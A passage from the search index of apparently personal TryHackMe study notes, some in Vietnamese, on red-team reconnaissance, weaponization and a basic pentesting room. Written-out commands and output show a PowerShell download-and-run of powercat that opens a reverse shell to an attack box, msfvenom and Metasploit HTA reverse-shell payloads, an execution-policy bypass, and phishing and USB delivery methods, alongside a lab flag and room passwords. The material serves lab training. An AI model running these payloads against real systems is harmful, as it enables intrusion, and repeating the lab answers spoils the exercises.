Access"},{"location":"tryhackme/red-teaming/init-access/red-team-reconnaissance/#types-of-reconnaissance-activities-cac-loai-trinh-sat","text":"Trinh s\u00e1t c\u00f3 th\u1ec3 chia l\u00e0m 2 lo\u1ea1i: Trinh s\u00e1t b\u1ecb \u0111\u1ed9ng: C\u00f3 th\u1ec3 th\u1ef1c hi\u1ec7n b\u1eb1ng vi\u1ec7c quan s\u00e1t nh\u1eefng g\u00ec c\u00f3 s\u1eb5n \u1edf m\u1ee5c ti\u00eau ho\u1eb7c \u1edf b\u00ean th\u1ee9 ba cung c\u1ea5p (d\u00f9ng c\u00e1c k\u0129 thu\u1eadt nh\u01b0 OSINT \u0111\u1ec3 thu th\u1eadp th\u00f4ng tin, ... whois, nslookup, dig, shodan.io, DNSDumpster,...) Trinh s\u00e1t ch\u1ee7 \u0111\u1ed9ng: C\u1ea7n ch\u1ee7 \u0111\u1ed9ng, t\u01b0\u01a1ng t\u00e1c v\u1edbi m\u1ee5c ti\u00eau nh\u1eb1m xem ph\u1ea3n \u1ee9ng c\u1ee7a n\u00f3 (c\u00e1c c\u00f4ng c\u1ee5 \u0111\u01b0\u1ee3c d\u00f9ng nh\u01b0 netcat, ping, traceroute, telnet, ...). Trong trinh s\u00e1t ch\u1ee7 \u0111\u1ed9ng, c\u00f3 th\u1ec3 chia l\u00e0m 2 nh\u00e1nh ti\u1ebfp c\u1eadn sau: Trinh s\u00e1t t\u1eeb b\u00ean ngo\u00e0i: \u0110\u01b0\u1ee3c ti\u1ebfn h\u00e0nh trinh s\u00e1t t\u1eeb b\u00ean ngo\u00e0i m\u1ea1ng n\u1ed9i b\u1ed9 c\u1ee7a m\u1ee5c ti\u00eau. Trinh s\u00e1t t\u1eeb b\u00ean trong: \u0110\u01b0\u1ee3c ti\u1ebfn h\u00e0nh trinh s\u00e1t t\u1eeb b\u00ean trong m\u1ea1ng n\u1ed9i b\u1ed9 c\u1ee7a m\u1ee5c ti\u00eau Recon-ng l\u00e0 m\u1ed9t framework gi\u00fap t\u1ef1 \u0111\u1ed9ng h\u00f3a c\u00f4ng vi\u1ec7c OSINT. N\u00f3 s\u1eed d\u1ee5ng c\u00e1c m\u00f4-\u0111un t\u1eeb nhi\u1ec1u t\u00e1c gi\u1ea3 kh\u00e1c nhau v\u00e0 cung c\u1ea5p v\u00f4 s\u1ed1 ch\u1ee9c n\u0103ng. M\u1ed9t s\u1ed1 m\u00f4-\u0111un y\u00eau c\u1ea7u c\u00e1c ph\u00edm \u0111\u1ec3 ho\u1ea1t \u0111\u1ed9ng; kh\u00f3a cho ph\u00e9p m\u00f4-\u0111un truy v\u1ea5n API tr\u1ef1c tuy\u1ebfn c\u00f3 li\u00ean quan. Trong nhi\u1ec7m v\u1ee5 n\u00e0y, ch\u00fang t\u00f4i s\u1ebd minh h\u1ecda b\u1eb1ng c\u00e1ch s\u1eed d\u1ee5ng Recon-ng trong thi\u1ebft b\u1ecb \u0111\u1ea7u cu\u1ed1i. marketplace search KEYWORD\u0111\u1ec3 t\u00ecm ki\u1ebfm c\u00e1c m\u00f4-\u0111un c\u00f3 s\u1eb5n v\u1edbi t\u1eeb kh\u00f3a . marketplace info MODULE\u0111\u1ec3 cung c\u1ea5p th\u00f4ng tin v\u1ec1 m\u00f4-\u0111un \u0111\u01b0\u1ee3c \u0111\u1ec1 c\u1eadp. marketplace install MODULE\u0111\u1ec3 c\u00e0i \u0111\u1eb7t m\u00f4-\u0111un \u0111\u01b0\u1ee3c ch\u1ec9 \u0111\u1ecbnh v\u00e0o Recon-ng. marketplace remove MODULE\u0111\u1ec3 g\u1ee1 c\u00e0i \u0111\u1eb7t m\u00f4-\u0111un \u0111\u01b0\u1ee3c ch\u1ec9 \u0111\u1ecbnh. tra ip ng\u01b0\u1ee3c: https://viewdns.info/ https://search.censys.io/ https://www.google.com/advanced_search reverse shell for window: msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.232.37 LPORT=443 -f hta-psh -o thm.hta reverse shell for window with vba: msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.18.80.57 LPORT=443 -f vba","title":"Types of reconnaissance activities (c\u00e1c lo\u1ea1i trinh s\u00e1t)"},{"location":"tryhackme/red-teaming/init-access/red-team-weaponization/","tags":["THM-Weaponization"],"text":"Weaponization \u00b6 Task 6: PowerShell - PSH \u00b6 PowerShell (PSH) \u00b6 PowerShell is an object-oriented programming language executed from the Dynamic Language Runtime (DLR) in .NET with some exceptions for legacy uses. Check out the TryHackMe room, Hacking with PowerShell for more information about PowerShell . Red teamers rely on PowerShell in performing various activities, including initial access, system enumerations, and many others. Let's start by creating a straightforward PowerShell script that prints \"Welcome to the Weaponization Room!\" as follows, Write-Output \"Welcome to the Weaponization Room!\" Save the file as thm.ps1 . With the Write-Output , we print the message \"Welcome to the Weaponization Room!\" to the command prompt. Now let's run it and see the result. CMD C :\\ Users \\ thm \\ Desktop > powershell -File thm . ps1 File C :\\ Users \\ thm \\ Desktop \\ thm . ps1 cannot be loaded because running scripts is disabled on this system . For more information , see about_Execution_Policies at http :// go . microsoft . com / fwlink / ? LinkID = 135170 . + CategoryInfo : SecurityError : (:) [], ParentContainsErrorRecordException + FullyQualifiedErrorId : UnauthorizedAccess C :\\ Users \\ thm \\ Desktop > Execution Policy \u00b6 PowerShell 's execution policy is a security option to protect the system from running malicious scripts. By default, Microsoft disables executing PowerShell scripts .ps1 for security purposes. The PowerShell execution policy is set to Restricted , which means it permits individual commands but not run any scripts. CMD PS C :\\ Users \\ thm > Get-ExecutionPolicy Restricted We can also easily change the PowerShell execution policy by running: CMD PS C :\\ Users \\ thm \\ Desktop > Set-ExecutionPolicy -Scope CurrentUser RemoteSigned Execution Policy Change The execution policy helps protect you from scripts that you do not trust . Changing the execution policy might expose you to the security risks described in the about_Execution_Policies help topic at http :// go . microsoft . com / fwlink / ? LinkID = 135170 . Do you want to change the execution policy ? [Y] Yes [A] Yes to All [N] No [L] No to All [S] Suspend [?] Help ( default is \"N\" ): A Bypass Execution Policy \u00b6 Microsoft provides ways to disable this restriction. One of these ways is by giving an argument option to the PowerShell command to change it to your desired setting. For example, we can change it to bypass policy which means nothing is blocked or restricted. This is useful since that lets us run our own PowerShell scripts. In order to make sure our PowerShell file gets executed, we need to provide the bypass option in the arguments as follows, CMD C :\\ Users \\ thm \\ Desktop > powershell -ex bypass -File thm . ps1 Welcome to Weaponization Room ! Now, let's try to get a reverse shell using one of the tools written in PowerShell , which is powercat . On your AttackBox, download it from GitHub and run a webserver to deliver the payload. CMD user @machine $ git clone https :// github . com / besimorhino / powercat . git Cloning into 'powercat' ... remote : Enumerating objects : 239 , done . remote : Counting objects : 100 % ( 4 / 4 ), done . remote : Compressing objects : 100 % ( 4 / 4 ), done . remote : Total 239 ( delta 0 ), reused 2 ( delta 0 ), pack-reused 235 Receiving objects : 100 % ( 239 / 239 ), 61 . 75 KiB | 424 . 00 KiB / s , done . Resolving deltas : 100 % ( 72 / 72 ), done . Now, we need to set up a web server on that AttackBox to serve the powercat.ps1 that will be downloaded and executed on the target machine. Next, change the directory to powercat and start listening on a port of your choice. In our case, we will be using port 8080 . Terminal user @machine $ cd powercat user @machine $ python3 -m http . server 8080 Serving HTTP on 0 . 0 . 0 . 0 port 8080 ( http :// 0 . 0 . 0 . 0 : 8080 /) ... On the AttackBox, we need to listen on port 1337 using nc to receive the connection back from the victim. Terminal user @machine $ nc -lvp 1337 Now, from the victim machine, we download the payload and execute it using PowerShell payload as follows, Terminal C :\\ Users \\ thm \\ Desktop > powershell -c \"IEX(New-Object System.Net.WebClient).DownloadString('http://ATTACKBOX_IP:8080/powercat.ps1');powercat -c ATTACKBOX_IP -p 1337 -e cmd\" Now that we have executed the command above, the victim machine downloads the powercat.ps1 payload from our web server (on the AttackBox) and then executes it locally on the target using cmd.exe and sends a connection back to the AttackBox that is listening on port 1337 . After a couple of seconds, we should receive the connection call back: Terminal user @machine $ nc -lvp 1337 listening on [any] 1337 ... 10 . 10 . 12 . 53 : inverse host lookup failed : Unknown host connect to [ 10 . 8 . 232 . 37 ] from ( UNKNOWN ) [ 10 . 10 . 12 . 53 ] 49804 Microsoft Windows [Version 10.0.14393] ( c ) 2016 Microsoft Corporation . All rights reserved . C :\\ Users \\ thm > Task 7: Command And Control - ( C2 Or C&C) \u00b6 This task introduces the basic concept of Command and Control ( C2 ) frameworks used in Red team operations. What is Command and Control ( C2 )? \u00b6 C2 frameworks are post-exploitation frameworks that allow red teamers to collaborate and control compromised machines. C2 is considered one of the most important tools for red teamers during offensive cyber operations. C2 frameworks provide fast and straightforward approaches to: Generate various malicious payloads Enumerate the compromised machine/networks Perform privilege escalation and pivoting Lateral movement And many others Some popular C2 frameworks that we'll briefly highlight are Cobalt Strike, PowerShell Empire, Metasploit. Most of these frameworks aim to support a convenient environment to share and communicate between red team operations once the initial access is gained to a system. Cobalt Strike \u00b6 Cobalt Strike is a commercial framework that focuses on Adversary Simulations and Red Team Operations. It is a combination of remote access tools, post-exploitation capabilities, and a unique reporting system. It provides an agent with advanced techniques to establish covert communications and perform various operations, including key-logging, files upload and download, VPN deployment, privilege escalation techniques, mimikatz, port scanning, and the most advanced lateral movements. PowerShell Empire \u00b6 PowerShell Empire is an open-source framework that helps red team operators and pen testers collaborate across multiple servers using keys and shared passwords. It is an exploitation framework based on PowerShell and Python agents. PowerShell Empire focuses on client-side and post-exploitation of Windows and Active Directory environment. If you want to learn more about PowerShell Empire, we suggest trying out this room: Empire . Metasploit \u00b6 Metasploit is a widely used exploitation framework that offers various techniques and tools to perform hacking easily. It is an open-source framework and is considered one of the primary tools for pentesting and red team operations. Metasploit is one of the tools we use in this room to generate payload for our weaponization stage. If you want to learn more about the Metasploit framework, we suggest checking the Metasploit module . Most of the C2 frameworks use the techniques mentioned in this room as preparation for the initial access stage. For more details about the C2 framework, we invite you to check the Intro to C2 room. Task 8: Delivery Techniques \u00b6 Delivery Techniques \u00b6 Delivery techniques are one of the important factors for getting initial access. They have to look professional, legitimate, and convincing to the victim in order to follow through with the content. Email Delivery \u00b6 It is a common method to use in order to send the payload by sending a phishing email with a link or attachment. For more info, visit here . This method attaches a malicious file that could be the type we mentioned earlier. The goal is to convince the victim to visit a malicious website or download and run the malicious file to gain initial access to the victim's network or host. The red teamers should have their own infrastructure for phishing purposes. Depending on the red team engagement requirement, it requires setting up various options within the email server, including DomainKeys Identified Mail (DKIM), Sender Policy Framework (SPF), and DNS Pointer (PTR) record. The red teamers could also use third-party email services such as Google Gmail, Outlook, Yahoo, and others with good reputations. Another interesting method would be to use a compromised email account within a company to send phishing emails within the company or to others. The compromised email could be hacked by phishing or by other techniques such as password spraying attacks. Web Delivery \u00b6 Another method is hosting malicious payloads on a web server controlled by the red teamers. The web server has to follow the security guidelines such as a clean record and reputation of its domain name and TLS (Transport Layer Security) certificate. For more information, visit here . This method includes other techniques such as social engineering the victim to visit or download the malicious file. A URL shortener could be helpful when using this method. In this method, other techniques can be combined and used. The attacker can take advantage of zero-day exploits such as exploiting vulnerable software like Java or browsers to use them in phishing emails or web delivery techniques to gain access to the victim machine. USB Delivery \u00b6 This method requires the victim to plug in the malicious USB physically. This method could be effective and useful at conferences or events where the adversary can distribute the USB. For more information about USB delivery, visit here . Often, organizations establish strong policies such as disabling USB usage within their organization environment for security purposes. While other organizations allow it in the target environment. Common USB attacks used to weaponize USB devices include Rubber Ducky and SBHarpoon , charging USB cable, such as O.MG Cable . Task 9: Practice Arena \u00b6 We have prepared a Windows 10 machine that runs a user simulation web app to execute your payloads or visit the malicious HTA links automatically. Deploy the attached machine and wait a couple of minutes until it's up and running. Then, visit the user simulator web application at http://MACHINE_IP:8080/ . Make sure to visit the user simulator web application from the AttackBox, or you can access it by connecting to the VPN. The web application allows uploading payloads as VBS, DOC, PS1 files. In addition, if you provide a malicious HTA link, the web application will visit your link. Note for Doc files : the simulation used in the provided Windows 10 machine will open the malicious Word document and be closed within 90 seconds. In order to get longer prescience, you need to migrate as soon as you receive the connection back. In the Metasploit framework, we can inject our current process into another process on the victim machine using migrate . In our case, we need to migrate our current process, which is the MS word document, into another process to make the connection stable even if the MS word document is closed. The easiest way to do this is by using migrate post-module as follow, Terminal meterpreter > run post / windows / manage / migrate [*] Running module against DESKTOP - 1AU6NT4 [*] Current server process : svchost . exe ( 3280 ) [*] Spawning notepad . exe process to migrate into [*] Spoofing PPID 0 [*] Migrating into 4960 [+] Successfully migrated into process 4960 In this task, the goal is to generate a reverse shell payload of your choice and send it through the web application. Once the web application runs your payload, you should receive a connect back. Answer the question below and prove your access by finding the flag once you receive a reverse shell. For reference, you can use the MSFVenom Cheat Sheet on this website . Answer the questions below What is the flag? Hint: Check the user desktop folder for the flag! Answer Explain THM { b4dbc2f16afdfe9579030a929b799719 } We will use script from task 4, two way to solve: The first way: We will create file reverse shell from msfvenom by: msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACK_IP LPORT=443 -f hta-psh -o thm.hta . And then send it to vim by python3 -m http.server 8080 . In attack machine, listen by nc -lnvp 443 . Terminal \u250c\u2500\u2500 ( kali \u327f kali )-[~] \u2514\u2500 $ nc -lvnp 443 listening on [any] 443 ... connect to [ 10 . 18 . 80 . 57 ] from ( UNKNOWN ) [ 10 . 10 . 142 . 139 ] 49917 Microsoft Windows [Version 10.0.14393] ( c ) 2016 Microsoft Corporation . All rights reserved . C :\\ app > ls -a ls -a 'ls' is not recognized as an internal or external command , operable program or batch file . Because this is a reverse shell from windows, you have to use a script to work on windows (using ls like on linux won't work). Now, we will search the Desktop of each user in the machine, we will get the flag The first way: This is a way to help us use linux command on the victim's terminal. Step by step is the same Task 4: Step 1: msfconsole -q Step 2: use exploit/windows/misc/hta_server Step 3: set LHOST ATTACKER_IP Step 4: set LPORT ATTACKER_PORT_OPEN Step 5: set SRVHOST ATTACKER_IP Step 6: set payload windows/meterpreter/reverse_tcp Step 7: exploit Terminal msf6 > use exploit / windows / misc / hta_server [*] No payload configured , defaulting to windows / meterpreter / reverse_tcp msf6 exploit ( windows / misc / hta_server ) > set lhost 10 . 18 . 80 . 57 lhost => 10 . 18 . 80 . 57 msf6 exploit ( windows / misc / hta_server ) > set lport 443 lport => 443 msf6 exploit ( windows / misc / hta_server ) > set srvhost 10 . 18 . 80 . 57 srvhost => 10 . 18 . 80 . 57 msf6 exploit ( windows / misc / hta_server ) > set payload windows / meterpreter / reverse_tcp payload => windows / meterpreter / reverse_tcp msf6 exploit ( windows / misc / hta_server ) > exploit [*] Exploit running as background job 0 . [*] Exploit completed , but no session was created . [*] Started reverse TCP handler on 10 . 18 . 80 . 57 : 443 msf6 exploit ( windows / misc / hta_server ) > [*] Using URL : http :// 10 . 18 . 80 . 57 : 8080 / hmMe6s . hta [*] Server started . Step 8: We will notice a highlighted url like the above terminal, send it to the victim website Step 9: Find sessions to work by: session -i command Step 10: Get flag Now, go back to the terminal with metasploit and we see that we have successfully connected to the windows shell","title":"Weaponization"},{"location":"tryhackme/red-teaming/init-access/red-team-weaponization/#weaponization","text":"","title":"Weaponization"},{"location":"tryhackme/red-teaming/init-access/red-team-weaponization/#task-6-powershell-psh","text":"","title":"Task 6: PowerShell - PSH"},{"location":"tryhackme/red-teaming/init-access/red-team-weaponization/#powershell-psh","text":"PowerShell is an object-oriented programming language executed from the Dynamic Language Runtime (DLR) in .NET with some exceptions for legacy uses. Check out the TryHackMe room, Hacking with PowerShell for more information about PowerShell . Red teamers rely on PowerShell in performing various activities, including initial access, system enumerations, and many others. Let's start by creating a straightforward PowerShell script that prints \"Welcome to the Weaponization Room!\" as follows, Write-Output \"Welcome to the Weaponization Room!\" Save the file as thm.ps1 . With the Write-Output , we print the message \"Welcome to the Weaponization Room!\" to the command prompt. Now let's run it and see the result. CMD C :\\ Users \\ thm \\ Desktop > powershell -File thm . ps1 File C :\\ Users \\ thm \\ Desktop \\ thm . ps1 cannot be loaded because running scripts is disabled on this system . For more information , see about_Execution_Policies at http :// go . microsoft . com / fwlink / ? LinkID = 135170 . + CategoryInfo : SecurityError : (:) [], ParentContainsErrorRecordException + FullyQualifiedErrorId : UnauthorizedAccess C :\\ Users \\ thm \\ Desktop >","title":"PowerShell (PSH)"},{"location":"tryhackme/red-teaming/init-access/red-team-weaponization/#execution-policy","text":"PowerShell 's execution policy is a security option to protect the system from running malicious scripts. By default, Microsoft disables executing PowerShell scripts .ps1 for security purposes. The PowerShell execution policy is set to Restricted , which means it permits individual commands but not run any scripts. CMD PS C :\\ Users \\ thm > Get-ExecutionPolicy Restricted We can also easily change the PowerShell execution policy by running: CMD PS C :\\ Users \\ thm \\ Desktop > Set-ExecutionPolicy -Scope CurrentUser RemoteSigned Execution Policy Change The execution policy helps protect you from scripts that you do not trust . Changing the execution policy might expose you to the security risks described in the about_Execution_Policies help topic at http :// go . microsoft . com / fwlink / ? LinkID = 135170 . Do you want to change the execution policy ? [Y] Yes [A] Yes to All [N] No [L] No to All [S] Suspend [?] Help ( default is \"N\" ): A","title":"Execution Policy"},{"location":"tryhackme/red-teaming/init-access/red-team-weaponization/#bypass-execution-policy","text":"Microsoft provides ways to disable this restriction. One of these ways is by giving an argument option to the PowerShell command to change it to your desired setting. For example, we can change it to bypass policy which means nothing is blocked or restricted. This is useful since that lets us run our own PowerShell scripts. In order to make sure our PowerShell file gets executed, we need to provide the bypass option in the arguments as follows, CMD C :\\ Users \\ thm \\ Desktop > powershell -ex bypass -File thm . ps1 Welcome to Weaponization Room ! Now, let's try to get a reverse shell using one of the tools written in PowerShell , which is powercat . On your AttackBox, download it from GitHub and run a webserver to deliver the payload. CMD user @machine $ git clone https :// github . com / besimorhino / powercat . git Cloning into 'powercat' ... remote : Enumerating objects : 239 , done . remote : Counting objects : 100 % ( 4 / 4 ), done . remote : Compressing objects : 100 % ( 4 / 4 ), done . remote : Total 239 ( delta 0 ), reused 2 ( delta 0 ), pack-reused 235 Receiving objects : 100 % ( 239 / 239 ), 61 . 75 KiB | 424 . 00 KiB / s , done . Resolving deltas : 100 % ( 72 / 72 ), done . Now, we need to set up a web server on that AttackBox to serve the powercat.ps1 that will be downloaded and executed on the target machine. Next, change the directory to powercat and start listening on a port of your choice. In our case, we will be using port 8080 . Terminal user @machine $ cd powercat user @machine $ python3 -m http . server 8080 Serving HTTP on 0 . 0 . 0 . 0 port 8080 ( http :// 0 . 0 . 0 . 0 : 8080 /) ... On the AttackBox, we need to listen on port 1337 using nc to receive the connection back from the victim. Terminal user @machine $ nc -lvp 1337 Now, from the victim machine, we download the payload and execute it using PowerShell payload as follows, Terminal C :\\ Users \\ thm \\ Desktop > powershell -c \"IEX(New-Object System.Net.WebClient).DownloadString('http://ATTACKBOX_IP:8080/powercat.ps1');powercat -c ATTACKBOX_IP -p 1337 -e cmd\" Now that we have executed the command above, the victim machine downloads the powercat.ps1 payload from our web server (on the AttackBox) and then executes it locally on the target using cmd.exe and sends a connection back to the AttackBox that is listening on port 1337 . After a couple of seconds, we should receive the connection call back: Terminal user @machine $ nc -lvp 1337 listening on [any] 1337 ... 10 . 10 . 12 . 53 : inverse host lookup failed : Unknown host connect to [ 10 . 8 . 232 . 37 ] from ( UNKNOWN ) [ 10 . 10 . 12 . 53 ] 49804 Microsoft Windows [Version 10.0.14393] ( c ) 2016 Microsoft Corporation . All rights reserved . C :\\ Users \\ thm >","title":"Bypass Execution Policy"},{"location":"tryhackme/red-teaming/init-access/red-team-weaponization/#task-7-command-and-control-c2-or-cc","text":"This task introduces the basic concept of Command and Control ( C2 ) frameworks used in Red team operations.","title":"Task 7: Command And Control - (C2 Or C&amp;C)"},{"location":"tryhackme/red-teaming/init-access/red-team-weaponization/#what-is-command-and-control-c2","text":"C2 frameworks are post-exploitation frameworks that allow red teamers to collaborate and control compromised machines. C2 is considered one of the most important tools for red teamers during offensive cyber operations. C2 frameworks provide fast and straightforward approaches to: Generate various malicious payloads Enumerate the compromised machine/networks Perform privilege escalation and pivoting Lateral movement And many others Some popular C2 frameworks that we'll briefly highlight are Cobalt Strike, PowerShell Empire, Metasploit. Most of these frameworks aim to support a convenient environment to share and communicate between red team operations once the initial access is gained to a system.","title":"What is Command and Control (C2)?"},{"location":"tryhackme/red-teaming/init-access/red-team-weaponization/#cobalt-strike","text":"Cobalt Strike is a commercial framework that focuses on Adversary Simulations and Red Team Operations. It is a combination of remote access tools, post-exploitation capabilities, and a unique reporting system. It provides an agent with advanced techniques to establish covert communications and perform various operations, including key-logging, files upload and download, VPN deployment, privilege escalation techniques, mimikatz, port scanning, and the most advanced lateral movements.","title":"Cobalt Strike"},{"location":"tryhackme/red-teaming/init-access/red-team-weaponization/#powershell-empire","text":"PowerShell Empire is an open-source framework that helps red team operators and pen testers collaborate across multiple servers using keys and shared passwords. It is an exploitation framework based on PowerShell and Python agents. PowerShell Empire focuses on client-side and post-exploitation of Windows and Active Directory environment. If you want to learn more about PowerShell Empire, we suggest trying out this room: Empire .","title":"PowerShell Empire"},{"location":"tryhackme/red-teaming/init-access/red-team-weaponization/#metasploit","text":"Metasploit is a widely used exploitation framework that offers various techniques and tools to perform hacking easily. It is an open-source framework and is considered one of the primary tools for pentesting and red team operations. Metasploit is one of the tools we use in this room to generate payload for our weaponization stage. If you want to learn more about the Metasploit framework, we suggest checking the Metasploit module . Most of the C2 frameworks use the techniques mentioned in this room as preparation for the initial access stage. For more details about the C2 framework, we invite you to check the Intro to C2 room.","title":"Metasploit"},{"location":"tryhackme/red-teaming/init-access/red-team-weaponization/#task-8-delivery-techniques","text":"","title":"Task 8: Delivery Techniques"},{"location":"tryhackme/red-teaming/init-access/red-team-weaponization/#delivery-techniques","text":"Delivery techniques are one of the important factors for getting initial access. They have to look professional, legitimate, and convincing to the victim in order to follow through with the content.","title":"Delivery Techniques"},{"location":"tryhackme/red-teaming/init-access/red-team-weaponization/#email-delivery","text":"It is a common method to use in order to send the payload by sending a phishing email with a link or attachment. For more info, visit here . This method attaches a malicious file that could be the type we mentioned earlier. The goal is to convince the victim to visit a malicious website or download and run the malicious file to gain initial access to the victim's network or host. The red teamers should have their own infrastructure for phishing purposes. Depending on the red team engagement requirement, it requires setting up various options within the email server, including DomainKeys Identified Mail (DKIM), Sender Policy Framework (SPF), and DNS Pointer (PTR) record. The red teamers could also use third-party email services such as Google Gmail, Outlook, Yahoo, and others with good reputations. Another interesting method would be to use a compromised email account within a company to send phishing emails within the company or to others. The compromised email could be hacked by phishing or by other techniques such as password spraying attacks.","title":"Email Delivery"},{"location":"tryhackme/red-teaming/init-access/red-team-weaponization/#web-delivery","text":"Another method is hosting malicious payloads on a web server controlled by the red teamers. The web server has to follow the security guidelines such as a clean record and reputation of its domain name and TLS (Transport Layer Security) certificate. For more information, visit here . This method includes other techniques such as social engineering the victim to visit or download the malicious file. A URL shortener could be helpful when using this method. In this method, other techniques can be combined and used. The attacker can take advantage of zero-day exploits such as exploiting vulnerable software like Java or browsers to use them in phishing emails or web delivery techniques to gain access to the victim machine.","title":"Web Delivery"},{"location":"tryhackme/red-teaming/init-access/red-team-weaponization/#usb-delivery","text":"This method requires the victim to plug in the malicious USB physically. This method could be effective and useful at conferences or events where the adversary can distribute the USB. For more information about USB delivery, visit here . Often, organizations establish strong policies such as disabling USB usage within their organization environment for security purposes. While other organizations allow it in the target environment. Common USB attacks used to weaponize USB devices include Rubber Ducky and SBHarpoon , charging USB cable, such as O.MG Cable .","title":"USB Delivery"},{"location":"tryhackme/red-teaming/init-access/red-team-weaponization/#task-9-practice-arena","text":"We have prepared a Windows 10 machine that runs a user simulation web app to execute your payloads or visit the malicious HTA links automatically. Deploy the attached machine and wait a couple of minutes until it's up and running. Then, visit the user simulator web application at http://MACHINE_IP:8080/ . Make sure to visit the user simulator web application from the AttackBox, or you can access it by connecting to the VPN. The web application allows uploading payloads as VBS, DOC, PS1 files. In addition, if you provide a malicious HTA link, the web application will visit your link. Note for Doc files : the simulation used in the provided Windows 10 machine will open the malicious Word document and be closed within 90 seconds. In order to get longer prescience, you need to migrate as soon as you receive the connection back. In the Metasploit framework, we can inject our current process into another process on the victim machine using migrate . In our case, we need to migrate our current process, which is the MS word document, into another process to make the connection stable even if the MS word document is closed. The easiest way to do this is by using migrate post-module as follow, Terminal meterpreter > run post / windows / manage / migrate [*] Running module against DESKTOP - 1AU6NT4 [*] Current server process : svchost . exe ( 3280 ) [*] Spawning notepad . exe process to migrate into [*] Spoofing PPID 0 [*] Migrating into 4960 [+] Successfully migrated into process 4960 In this task, the goal is to generate a reverse shell payload of your choice and send it through the web application. Once the web application runs your payload, you should receive a connect back. Answer the question below and prove your access by finding the flag once you receive a reverse shell. For reference, you can use the MSFVenom Cheat Sheet on this website . Answer the questions below What is the flag? Hint: Check the user desktop folder for the flag! Answer Explain THM { b4dbc2f16afdfe9579030a929b799719 } We will use script from task 4, two way to solve: The first way: We will create file reverse shell from msfvenom by: msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACK_IP LPORT=443 -f hta-psh -o thm.hta . And then send it to vim by python3 -m http.server 8080 . In attack machine, listen by nc -lnvp 443 . Terminal \u250c\u2500\u2500 ( kali \u327f kali )-[~] \u2514\u2500 $ nc -lvnp 443 listening on [any] 443 ... connect to [ 10 . 18 . 80 . 57 ] from ( UNKNOWN ) [ 10 . 10 . 142 . 139 ] 49917 Microsoft Windows [Version 10.0.14393] ( c ) 2016 Microsoft Corporation . All rights reserved . C :\\ app > ls -a ls -a 'ls' is not recognized as an internal or external command , operable program or batch file . Because this is a reverse shell from windows, you have to use a script to work on windows (using ls like on linux won't work). Now, we will search the Desktop of each user in the machine, we will get the flag The first way: This is a way to help us use linux command on the victim's terminal. Step by step is the same Task 4: Step 1: msfconsole -q Step 2: use exploit/windows/misc/hta_server Step 3: set LHOST ATTACKER_IP Step 4: set LPORT ATTACKER_PORT_OPEN Step 5: set SRVHOST ATTACKER_IP Step 6: set payload windows/meterpreter/reverse_tcp Step 7: exploit Terminal msf6 > use exploit / windows / misc / hta_server [*] No payload configured , defaulting to windows / meterpreter / reverse_tcp msf6 exploit ( windows / misc / hta_server ) > set lhost 10 . 18 . 80 . 57 lhost => 10 . 18 . 80 . 57 msf6 exploit ( windows / misc / hta_server ) > set lport 443 lport => 443 msf6 exploit ( windows / misc / hta_server ) > set srvhost 10 . 18 . 80 . 57 srvhost => 10 . 18 . 80 . 57 msf6 exploit ( windows / misc / hta_server ) > set payload windows / meterpreter / reverse_tcp payload => windows / meterpreter / reverse_tcp msf6 exploit ( windows / misc / hta_server ) > exploit [*] Exploit running as background job 0 . [*] Exploit completed , but no session was created . [*] Started reverse TCP handler on 10 . 18 . 80 . 57 : 443 msf6 exploit ( windows / misc / hta_server ) > [*] Using URL : http :// 10 . 18 . 80 . 57 : 8080 / hmMe6s . hta [*] Server started . Step 8: We will notice a highlighted url like the above terminal, send it to the victim website Step 9: Find sessions to work by: session -i command Step 10: Get flag Now, go back to the terminal with metasploit and we see that we have successfully connected to the windows shell","title":"Task 9: Practice Arena"},{"location":"tryhackme/red-teaming/privilege-escalation/","tags":["THM-Privilege Escalation"],"text":"Privilege Escalation \u00b6 aa HTML for content and structure JavaScript for interactivity CSS for text running out of boxes Internet Explorer ... huh?","title":"Privilege Escalation"},{"location":"tryhackme/red-teaming/privilege-escalation/#privilege-escalation","text":"aa HTML for content and structure JavaScript for interactivity CSS for text running out of boxes Internet Explorer ... huh?","title":"Privilege Escalation"},{"location":"tryhackme/red-teaming/privilege-escalation/window-privilege-escalation/","text":"","title":"Index"},{"location":"tryhackme/room/","text":"","title":"Index"},{"location":"tryhackme/room/basic-pentesting/","tags":["THM-Pentest","THM-Privilege Escalation"],"text":"Basic Pentesting \u00b6 Link room: https://tryhackme.com/room/basicpentestingjt Task 1: Web App Testing and Privilege Escalation \u00b6 In these set of tasks you'll learn the following: brute forcing hash cracking service enumeration Linux Enumeration The main goal here is to learn as much as possible. Make sure you are connected to our network using your OpenVPN configuration file. Credits to Josiah Pierce from Vulnhub. Answer the questions below Deploy the machine and connect to our network Answer No needed answer Find the services exposed by the machine Answer No needed answer What is the name of the hidden directory on the web server(enter name without /)? Answer Explain development Use gobuster tool to find directory User brute-forcing to find the username & password Answer Explain jan Use enum4linux -a HOST What is the username? Answer jan What is the password? Answer armando What service do you use to access the server(answer in abbreviation in all caps)? Answer No needed answer Enumerate the machine to find any vectors for privilege escalation Answer No needed answer What is the name of the other user you found(all lower case)? Answer kay If you have found another user, what can you do with this information? Answer No needed answer What is the final password you obtain? Answer heresareallystrongpasswordthatfollowsthepasswordpolicy $$","title":"Basic Pentesting"},{"location":"tryhackme/room/basic-pentesting/#basic-pentesting","text":"Link room: https://tryhackme.com/room/basicpentestingjt","title":"Basic Pentesting"},{"location":"tryhackme/room/basic-pentesting/#task-1-web-app-testing-and-privilege-escalation","text":"In these set of tasks you'll learn the following: brute forcing hash cracking service enumeration Linux Enumeration The main goal here is to learn as much as possible. Make sure you are connected to our network using your OpenVPN configuration file. Credits to Josiah Pierce from Vulnhub. Answer the questions below Deploy the machine and connect to our network Answer No needed answer Find the services exposed by the machine Answer No needed answer What is the name of the hidden directory on the web server(enter name without /)? Answer Explain development Use gobuster tool to find directory User brute-forcing to find the username & password Answer Explain jan Use enum4linux -a HOST What is the username? Answer jan What is the password? Answer armando What service do you use to access the server(answer in abbreviation in all caps)? Answer No needed answer Enumerate the machine to find any vectors for privilege escalation Answer No needed answer What is the name of the other user you found(all lower case)? Answer kay If you have found another user, what can you do with this information? Answer No needed answer What is the final password you obtain? Answer heresareallystrongpasswordthatfollowsthepasswordpolicy $$","title":"Task 1: Web App Testing and Privilege Escalation"},{"location":"tryhackme/room/empire/","tags":["Intro Powershell Empire"],"text":"TryHackMe - empire \u00b6 Task 1: Introduction \u00b6","title":"TryHackMe - 